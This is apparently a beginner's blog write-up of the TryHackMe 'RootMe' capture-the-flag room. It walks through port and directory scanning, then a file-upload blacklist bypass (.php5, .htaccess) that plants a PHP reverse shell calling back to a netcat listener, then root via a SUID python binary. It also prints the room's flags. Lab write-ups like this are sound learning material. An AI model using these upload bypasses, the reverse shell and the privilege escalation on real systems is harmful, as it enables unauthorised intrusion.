---
layout: post
title: "TryHackMe: RootMe"
date: 2025-03-09 17:33:44 -0300
categories: TryHackMe CTF
tags: nmap, ssh, http, curl, apache, dirbuster, gobuster, dirb, locate, find, updatedb, tar, nc, php-reverse-shell, file-upload, file-upload-bypass, htaccess, reverse-shell, php5, www-data, gtfobins, python, suid, privilege-escalation, pty, spawn, bash, cybersecurity

author: yaza
# description: My first CTF, Basic Pentesting was a straightforward room...
media_subpath:
image:
  path: /11d59cb34397e986062eb515f4d32421.png
---

Heyooo, let's go for our second CTF ever, I'm using VPN not the attacker's machine provided by THM.

[Room Link](https://tryhackme.com/room/rrootme)

```shell
└─$ nmap 10.10.188.96
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-09 11:38 EDT
Nmap scan report for 10.10.188.96
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

#### Scan the machine, how many ports are open?

Answer: `2`

#### What version of Apache is running?

```shell
└─$ curl 10.10.188.96/showmeapacheversioooon
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.10.188.96 Port 80</address>
</body></html>
```

Answer: `2.4.29`

#### What service is running on port 22?

Answer: `ssh`

#### Find directories on the web server using the GoBuster tool.

**What is the hidden directory?**

We gonna use Dirbuster instead...
`which dirbuster` to see if it is installed... yes it's.
Lets find the wordlist

```shell
└─$ locate "*rockyou.txt"
/usr/share/wordlists/rockyou.txt
```

You can also use `find` but find can take way longer since it doesnt look on the indexed database as `locate`, if `locate` doesnt find you can update the database: `sudo updatedb`

```shell
└─$ find / -type f -name "*rockyou.txt" 2>/dev/null
/usr/share/wordlists/rockyou.txt
```

```shell
└─$ dirbuster -h
Examples:
Usage: java -jar DirBuster-1.0-RC1 -u <URL http://example.com/> [Options]

Run DirBuster in headless mode
java -jar DirBuster-1.0-RC1.jar -H -u https://www.target.com/

Start GUI with target prepopulated
java -jar DirBuster-1.0-RC1.jar -u https://www.target.com/

```

Looks like dirbuster uses GUI... let's try the headless mode:

```shell
└─$ dirbuster -H -l /usr/share/wordlists/rockyou.txt -u http://10.10.188.96

java.lang.NullPointerException: Cannot read field "jPanelRunning" because "this.gui" is null
        at com.sittinglittleduck.DirBuster.Manager.start(Manager.java:725)
        at com.sittinglittleduck.DirBuster.Start.main(Start.java:344)
```

Dind't work. Lets try as the example.

```shell
└─$ java -jar DirBuster -u http://10.10.188.96/> -l /usr/share/wordlists/rockyou.txt
Error: Unable to access jarfile DirBuster
```

Dind't work. Let's just use Dirb instead...

```shell
└─$ man dirb
       dirb <url_base> <url_base> [<wordlist_file(s)>] [options]
```

Issue:

```shell
dirb http://10.10.188.96/ /usr/share/wordlists/rockyou.txt
```

```shell
DIRB v2.22

START_TIME: Sun Mar  9 12:12:15 2025
URL_BASE: http://10.10.188.96/
WORDLIST_FILES: /usr/share/wordlists/rockyou.txt

-----------------

zsh: killed     dirb http://10.10.188.96/ /usr/share/wordlists/rockyou.txt
```

I read something on man page about dumb terminals, lets try use the Silent Mode:

```shell
dirb http://10.10.188.96/ /usr/share/wordlists/rockyou.txt -S
```

It's taking forever... loading... really forever.... `rockyou.txt` is massive (over 14 million words).
Shouldn't be so hard, so lets try a small wordlist.
Here we go, found some:

```shell
[/usr/share/wordlists/dirb]
└─$ ls
big.txt     common.txt   extensions_common.txt  mutations_common.txt  small.txt    stress
catala.txt  euskera.txt  indexes.txt            others                spanish.txt  vulns
```

Here we go, again!!

```shell
dirb http://10.10.188.96/ /usr/share/wordlists/dirb/common.txt
```

Still taking forever... Its looks like Gobuster is way faster, maybe thats the HINT recommend to use it (?) Oh! After a while we found `==> DIRECTORY: http://10.10.188.96/css/` that returns directories, let's go!

Wait, I'll try to run GoBuster to see if it goes fastter.
btw, `locate` is a really usefull command to copy directory paths!

```shell
root@ip-10-10-72-98:/usr/share/wordlists/dirb# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.188.96
```

Holy! That wasss WAYYYY FASTERRR!
It finished in 10s while the dirb is still runniiiing, using the same wordlist!

```shell
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 310] [--> http://10.10.188.96/css/]
/index.php            (Status: 200) [Size: 616]
/js                   (Status: 301) [Size: 309] [--> http://10.10.188.96/js/]
/panel                (Status: 301) [Size: 312] [--> http://10.10.188.96/panel/]
/server-status        (Status: 403) [Size: 277]
/uploads              (Status: 301) [Size: 314]
```

What is the hidden directory?
Answer: `/panel/`

#### Getting a shell

It's Google time!
[PentestMonekey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)
Downloaded and extracted:

```shell
tar -xvf php-reverse-shell-1.0.tar.gz
```

uploaded `php-reverse-shell.php` and got an error: `PHP is not allowed`
So I renamed the file and took off the extension `php`. Worked! Uploaded.
Problem, uploaded the shell misconfigurated...
So I oppened the shell and config my IP and a random port

```
$ip = '10.6.31.245';
$port = 2310;
```

start a TCP listener on a host and port issued above using Netcat:

```shell
$ nc -v -n -l -p 1234
```

Uploaded again, and got the same error, its not working as a PHP on the live server, maybe because I removed the extension... We need to find another bypass, Google time!

`yophp-reverse-shell.php.txt` Didnt work.
`yophp-reverse-shell.txt.php` Same.
reading time: [Link](https://www.acunetix.com/websitesecurity/upload-forms-threat/)
`yophp-reverse-shell.pHP` Naya (didnt work), Ok, the server is not soo dump, keep reading...
tried to upload a .htaccess with `AddType application/x-httpd-php .php`, and reuploaded the .php file, not allowed... wait I've done it incorrectly
.htaccess:

```
AddType application/x-httpd-php .jpg
```

Renamed revershell: `yophp-reverse-shell.jpg`, uploaded both again, and... fail.
Got this error on website when try to run the shell: `The image "http://10.10.188.96/uploads/yophp-reverse-shell.jpg" cannot be displayed because it contains errors`

"a file named *index.php.123* will be interpreted as a PHP file by the Apache HTTP Server and it will be executed. This, of course, will only work if the last extension (in this case *.123*) is not specified in the list of MIME-types known to the web server."

Relevant to know, but didnt work on our case.

Ok that link didn't help at all, but was a nice to know.

Renamed to: `php-reverse-shell.php5` and uploaded again, got this output:
`WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111) `
Maybe the problem is the connection with the reverseshell? Waiiit, I'm looking at the terminal now and I see a connection...

```shell
└─$ nc -v -n -l -p 2310
listening on [any] 2310 ...
connect to [10.6.31.245] from (UNKNOWN) [10.10.188.96] 38518
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:40:08 up  2:21,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Let'ss go! Lets search for the user.txt file as requested:

```shell
locate "user.txt"
```

didnt work... Then I'll move around using `cd`, ok can't find the file.
Let's try to use the find command we saw before:

```shell
$ find / -type f -name "user.txt" 2>/dev/null
/var/www/user.txt
```

Workeeeeed!

```shell
$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

Answer: `THM{y0u_g0t_a_sh3ll}`

But wait, I'm willing to test more stuffs but first lets try to understand why `locate` didnt work... well I guess its because the updatedb is not up to date and i can't do it right now since I'm not sudo... let's leave like that.

```shell
$ updatedb
updatedb: can not open a temporary file for `/var/lib/mlocate/mlocate.db'
$ whoami
www-data
```

Actually others tests that I've done like rename the reverseshell to: `php-reverse-shell.php.123` also worked but I thought it was an error getting:
`WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111)`

~~GG.~~

[Link for other source](https://portswigger.net/web-security/file-upload)
"Insufficient blacklisting of dangerous file types

One of the more obvious ways of preventing users from uploading malicious scripts is to blacklist potentially dangerous file extensions like `.php`. The practice of blacklisting is inherently flawed as it's difficult to explicitly block every possible file extension that could be used to execute code. Such blacklists can sometimes be bypassed by using lesser known, alternative file extensions that may still be executable, such as `.php5`, `.shtml`, and so on."

Oh, there's another question actually, let's go!

### Privilege escalation

#### Search for files with SUID permission, which file is weird?

Following the HINT (`find / -user root -perm /4000`)
-user root filters based on the owner
-perm filter based on permission
/4000 is the bit setuid (Set User ID) when its executed it uses the **permission of the owner** (root in this case) not the permission of the user who executes the file.
"2>/dev/null" to filter off the permissions denied

```shell
$ find / -user root -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
```

Answer: `/usr/bin/python`

#### Find a form to escalate your privileges.

Hint: Search for gtfobins.
Found it: [Link](https://gtfobins.github.io/gtfobins/python/)

```shell
python -c 'import os; os.system("/bin/sh")'
```

Stucked, thinking...
Ok I'm reading someone else's write-up now:

```shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

```shell
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

whoami
root

cd root
ls
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

GG!

## Conclusion

Practiced to use on Linux terminal: `locate` `find` `which` `tar` `nc`
ReverseShell
File Upload Bypass
Dirb is less agressive but wait slower than Gobuster.
Dirbuster is GUI.
Gtfobins
